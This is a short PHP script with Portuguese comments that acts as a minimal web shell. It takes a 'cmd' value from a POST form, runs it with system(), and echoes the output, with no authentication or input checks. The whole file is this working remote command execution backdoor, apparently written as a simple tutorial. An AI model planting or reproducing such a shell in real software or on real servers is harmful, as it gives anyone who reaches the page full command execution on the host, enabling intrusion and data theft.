<?php

//if para saber se veio via post
if ($_SERVER["REQUEST_METHOD"] === "POST") {
	
	//irá recuperar via post o que foi enviado
	$cmd = $_POST["cmd"];

	//tag do html para vir pré-formatado
	echo "<pre>";

	//executando uma ação e recebendo um retorno
	$comando = system($cmd, $retorno);

	//fechando a tag
	echo "</pre>";

}

?>

<form method="post">
	
	<input type="text" name="cmd">
	<button type="submit">Enviar</button>

</form>